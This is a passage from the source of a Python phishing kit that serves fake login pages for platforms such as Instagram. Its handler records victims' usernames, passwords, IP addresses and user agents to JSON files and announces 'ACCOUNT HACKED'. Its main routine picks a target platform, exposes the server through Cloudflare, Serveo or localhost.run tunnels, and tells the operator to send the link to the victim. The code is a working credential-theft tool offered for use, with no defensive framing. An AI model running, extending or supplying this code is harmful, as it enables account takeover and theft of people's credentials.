        page = PAGES.get(self.selected_page, PAGES["instagram"])
        self.wfile.write(page["html"].encode("utf-8"))

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8")
            try:
                data = json.loads(body)
                user = data.get("username", "")
                pwd = data.get("password", "")
            except:
                params = parse_qs(body)
                user = params.get("username", [""])[0]
                pwd = params.get("password", [""])[0]
            ip = self.client_address[0]
            log_file = f"creds_{self.selected_page}.json"
            entry = {
                "platform": self.selected_page,
                "username": user,
                "password": pwd,
                "ip": ip,
                "user_agent": self.headers.get("User-Agent", "N/A"),
                "timestamp": datetime.now().isoformat()
            }
            entries = []
            if os.path.exists(log_file):
                with open(log_file, "r") as f:
                    try: entries = json.load(f)
                    except: entries = []
            entries.append(entry)
            with open(log_file, "w") as f:
                json.dump(entries, f, indent=2)
            print(f"""
{C.RED}  ╔══════════════════════════════════════════════════════════╗
{C.RED}  ║{C.WHITE}  🎭 {S.BRIGHT}ACCOUNT HACKED{S.RESET_ALL}                                       {C.RED}║
{C.RED}  ╠══════════════════════════════════════════════════════════╣
{C.RED}  ║{C.WHITE}  📱 Platform : {C.YELLOW}{self.selected_page.upper()}{' '*(36-len(self.selected_page))}{C.RED}║
{C.RED}  ║{C.WHITE}  👤 Username : {C.YELLOW}{user}{' '*(36-len(user))}{C.RED}║
{C.RED}  ║{C.WHITE}  🔑 Password : {C.YELLOW}{pwd}{' '*(36-len(pwd))}{C.RED}║
{C.RED}  ║{C.WHITE}  🌐 IP       : {C.YELLOW}{ip}{' '*(36-len(ip))}{C.RED}║
{C.RED}  ╚══════════════════════════════════════════════════════════╝{S.RESET_ALL}
""")
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status":"ok"}).encode())
        else:
            self.send_response(404)
            self.end_headers()


def main():
    global PORT
    os.system("cls" if os.name=="nt" else "clear")
    print(BANNER)

    print(f"  {C.RED}◆ {S.BRIGHT}SELECT TARGET PLATFORM{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
    platforms = list(PAGES.keys())
    for i, key in enumerate(platforms, 1):
        page = PAGES[key]
        print(f"    {C.RED}[{i}]{C.WHITE} {page['name']}{' '*(20-len(page['name']))} {C.RED}➤{C.WHITE} Port {PORT+i-1}")
    print(f"    {C.RED}[0]{C.WHITE} Exit\n")

    try:
        choice = int(input(f"  {C.RED}► {C.WHITE}Choose platform {C.RED}(0-{len(platforms)}){C.WHITE}: {S.RESET_ALL}"))
    except:
        print(f"  {C.RED}Invalid input.{S.RESET_ALL}")
        sys.exit(0)
    if choice == 0:
        print(f"  {C.RED}Exiting...{S.RESET_ALL}")
        sys.exit(0)
    if choice < 1 or choice > len(platforms):
        print(f"  {C.RED}Invalid choice.{S.RESET_ALL}")
        sys.exit(1)

    selected_key = platforms[choice-1]
    PORT = PORT + (choice-1)
    selected_page = selected_key

    print(f"\n  {C.RED}◆ {S.BRIGHT}INITIALIZING {PAGES[selected_key]['name'].upper()} PHISH{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    if is_port_in_use(PORT):
        print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Port {PORT} in use, attempting to free...")
        if not kill_process_on_port(PORT):
            new_port = find_available_port(PORT)
            if new_port:
                PORT = new_port
                print(f"    {C.YELLOW}  Switched to port {PORT}{S.RESET_ALL}")
            else:
                print(f"    {C.RED}✗{S.RESET_ALL}  No available ports"); sys.exit(1)
        else:
            time.sleep(1)
            if is_port_in_use(PORT):
                print(f"    {C.RED}✗{S.RESET_ALL}  Could not free port"); sys.exit(1)
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Port freed")

    spinner("Starting HTTP server...", 0.5)
    handler = PhishHandler
    handler.selected_page = selected_key
    server = HTTPServer(("0.0.0.0", PORT), handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    local_ip = get_local_ip()
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Server online on port {PORT}")
    print(f"    {C.WHITE}→{S.RESET_ALL}  Local: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    print(f"\n  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
    public_url = None
    tunnel_name = None

    print(f"    {C.WHITE}[1/3]{S.RESET_ALL} Cloudflare Tunnel")
    public_url = start_cloudflared_tunnel()
    if public_url: tunnel_name = "Cloudflare"
    if not public_url:
        print(f"    {C.WHITE}[2/3]{S.RESET_ALL} Serveo SSH")
        public_url = start_serveo_tunnel()
        if public_url: tunnel_name = "Serveo"
    if not public_url:
        print(f"    {C.WHITE}[3/3]{S.RESET_ALL} localhost.run")
        public_url = start_localhost_run()
        if public_url: tunnel_name = "localhost.run"

    print(f"\n  {C.RED}◆ {S.BRIGHT}PHISHING LINK{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
    if public_url:
        print(f"    {C.GREEN}●{S.RESET_ALL}  Status : {C.GREEN}CONNECTED{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Method : {C.WHITE}{tunnel_name}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Link   : {C.YELLOW}{S.BRIGHT}{public_url}{S.RESET_ALL}")
        print(f"\n  {C.RED}{S.BRIGHT}  ► SEND THIS LINK TO VICTIM:{S.RESET_ALL}")
        print(f"  {C.YELLOW}  {public_url}{S.RESET_ALL}")
    else:
        print(f"    {C.RED}●{S.RESET_ALL}  Status : {C.RED}NO TUNNEL{S.RESET_ALL}")
        print(f"    {C.WHITE}  Use local: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")
    print(f"\n  {C.WHITE}  ◆ Waiting for credentials... {C.RED}Ctrl+C{S.RESET_ALL} {C.WHITE}to stop.{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}\n")

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C.RED}◆ {S.BRIGHT}SHUTDOWN{S.RESET_ALL}")
        print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Server stopped")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Credentials saved to creds_{selected_key}.json")
        print(f"\n  {C.MAGENTA}  null7 says goodbye.{S.RESET_ALL}\n")
        server.shutdown()
        sys.exit(0)

if __name__ == "__main__":
    main()